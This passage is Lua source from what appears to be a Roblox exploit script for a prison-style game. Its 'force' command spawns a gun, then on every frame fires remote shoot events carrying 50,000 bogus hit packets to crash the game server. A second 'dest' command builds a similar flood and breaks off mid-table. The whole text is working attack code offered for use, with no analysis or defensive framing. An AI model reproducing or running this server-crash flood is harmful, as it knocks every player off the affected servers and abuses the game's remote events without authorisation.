if Cmd == "force" then

local Packets = {}

CrashForceServerDie = true

Run.Stepped:Connect(function()

coroutine.wrap(function()
coroutine.resume(coroutine.create(function()

if CrashForceServerDie then

ItemHandler:InvokeServer(ItemGiver["M9"].ITEMPICKUP)

local Gun = LPlayer.Character:FindFirstChild("M9") or LPlayer.Backpack:FindFirstChild("M9")

coroutine.wrap(function()
for SendToServer = 1,50000 do
coroutine.wrap(function()
coroutine.resume(coroutine.create(function()
Packets[SendToServer] = {
[1] = {
Cframe = CFrame.new(),
Hit = workspace:FindFirstChildOfClass("Part")
},
[2] = {
Cframe = CFrame.new(),
Hit = workspace:FindFirstChildOfClass("Part")
},
[3] = {
Cframe = CFrame.new(),
Hit = workspace:FindFirstChildOfClass("Part")
},
[4] = {
Cframe = CFrame.new(),
Hit = workspace:FindFirstChildOfClass("Part")
}
}
end))
end)()
end
end)()

coroutine.wrap(function()
for ReplicateSends = 1,3 do
coroutine.wrap(function()
coroutine.resume(coroutine.create(function()
ShootEvent:FireServer(Packets,Gun)
end))
end)()
end
end)()

end

end))
end)()

end)

wait()

CrashForceServerDie = false

end

if Cmd == "dest" then

local Packets = {}

ItemHandler:InvokeServer(ItemGiver["Remington 870"].ITEMPICKUP)

local Gun = LPlayer.Character:FindFirstChild("Remington 870") or LPlayer.Backpack:FindFirstChild("Remington 870")

for SendToServer = 1,24998 do
Packets[SendToServer] = {
{
